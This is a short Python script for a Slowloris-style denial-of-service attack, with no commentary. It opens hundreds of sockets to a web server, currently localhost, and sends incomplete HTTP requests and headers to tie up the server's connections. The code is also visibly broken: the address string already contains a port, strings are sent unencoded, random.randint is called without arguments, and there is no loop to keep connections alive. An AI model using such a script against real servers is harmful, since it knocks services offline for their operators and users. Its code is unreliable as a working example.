import socket
import random
import time

sockets = []
regular_headers = [
    "User-agent:Mozilla/5.0 (Windows NT x.y; rv:10.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = '127.0.0.1:80'
socket_count = 500

for _ in range(socket_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
    except socket.error:
        break
    sockets.append(s)

#create the sockets
#send regular headers

for s in sockets:
    s.send("GET /?{} HTTP/1.1".format(random.randint(0, 2000)))
    for header in regular_headers:
        s.send("{}\r\n".format(header))


for s in sockets:
    s.send("X-a: {}".format(random.randint()))
